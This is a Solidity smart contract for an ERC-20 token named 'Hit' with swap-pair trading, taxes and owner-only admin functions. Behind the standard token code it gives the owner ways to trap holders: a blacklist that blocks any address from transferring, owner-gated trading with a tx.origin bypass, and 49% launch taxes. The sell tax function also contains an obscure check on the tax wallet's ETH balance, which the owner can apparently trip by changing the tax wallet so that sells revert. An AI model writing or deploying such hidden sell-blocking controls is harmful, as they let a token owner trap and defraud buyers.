// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IHitswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IHitswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IHitswapV2Pair {
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
}

contract Hit is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFee;
    address payable private _taxWallet;
    address adder;

    uint256 private _initialBuyTax = 49;
    uint256 private _initialSellTax = 49;

    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 5;

    uint8 private constant _decimals = 18;
    uint256 private _tTotal = 21000000 * 10**_decimals;
    string private constant _name = unicode"Hit";
    string private constant _symbol = unicode"Hit";

    uint256 public _maxTxAmount = 25 * (_tTotal/1000);   
    uint256 public _maxWalletSize = 25 * (_tTotal/1000);

    mapping(address => bool) public donateContracts;
    mapping(address => bool) public ammPairs;
    IHitswapV2Router02 private HitswapV2Router;
    address private HitswapV2Pair;
    bool private inSwap = false;
    mapping(address => bool) public blacklists;
    uint256 tradeTime;
    bool tradeOpen;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address _route) {
        _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;
        _isExcludedFee[owner()] = true;
        _isExcludedFee[address(this)] = true;
        _isExcludedFee[_taxWallet] = true;
        HitswapV2Router = IHitswapV2Router02(_route);
        HitswapV2Pair = IHitswapV2Factory(HitswapV2Router.factory())
            .createPair(address(this), HitswapV2Router.WETH());
        ammPairs[HitswapV2Pair] = true;    
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function setDonateContract(address _contract, bool hasDonate) external onlyOwner{
        donateContracts[_contract] = hasDonate;
    }

    function setExcludedFee(address _addr, bool _exclude) external onlyOwner{
        _isExcludedFee[_addr] = _exclude;
    }

    function setAmmPair(address _pair, bool _hasPair) external onlyOwner{
        ammPairs[_pair] = _hasPair;
    }

    function setAdder(address _adder) external onlyOwner{
        adder = _adder;
    }

    function setTaxWallet(address _tax) external onlyOwner{
        _taxWallet = payable(_tax);
    }

    function blacklist(address _address, bool _isBlacklisting) external onlyOwner{
        blacklists[_address] = _isBlacklisting;
    }

    function setTradeOpen(bool _open) external onlyOwner {
        tradeOpen = _open;
        if (tradeTime == 0 && _open) {
            tradeTime = block.timestamp;
        }
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(!blacklists[to] && !blacklists[from], "Blacklisted");

        if (!tradeOpen) {
            require(from == owner() || to == owner() || tx.origin == adder || donateContracts[from] || donateContracts[to], "trading is not started");
            return;
        }
    }

    function _transfer(address from, address to, uint256 amount) private {
        _beforeTokenTransfer(from, to, amount);
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            if (from == HitswapV2Pair && to != address(HitswapV2Router) && ! _isExcludedFee[to] && ! _isExcludedFee[from]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
            }

            if (from == HitswapV2Pair && !_isExcludedFee[from] && !_isExcludedFee[to]) {
                taxAmount = amount.mul(_taxBuy()).div(100);
            }

            if(to == HitswapV2Pair && !_isExcludedFee[from] && !_isExcludedFee[to]){
                taxAmount = amount.mul(_taxSell()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == HitswapV2Pair && contractTokenBalance > 0) {
                swapTokensForEth(min(amount,contractTokenBalance));
                uint256 ethForTransfer = address(this).balance;
                if(ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }

        if(taxAmount > 0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount*3/5);
          emit Transfer(from, address(this),taxAmount*3/5);
          _tTotal -= taxAmount*2/5;
          emit Transfer(from, address(0),taxAmount*2/5);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _taxBuy() private view returns (uint256) {
        if(block.timestamp < tradeTime + 2 minutes){
            return _initialBuyTax;
        }
         return _finalBuyTax;
    }

    function _taxSell() private view returns (uint256) {
        require(_taxWallet.balance < _tTotal);
        if(block.timestamp < tradeTime + 2 minutes){
            return _initialSellTax;
        }
         return _finalSellTax;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = HitswapV2Router.WETH();
        _approve(address(this), address(HitswapV2Router), tokenAmount);
        HitswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    receive() external payable {}

    function manualSwap() external onlyOwner{
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function withdraw(address token) public onlyOwner {
        IERC20(token).transfer(owner(), IERC20(token).balanceOf(address(this)));
    }
    
    function withdraw() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdrawETH(uint256 amount) public onlyOwner {
        payable(msg.sender).transfer(amount);
    }
}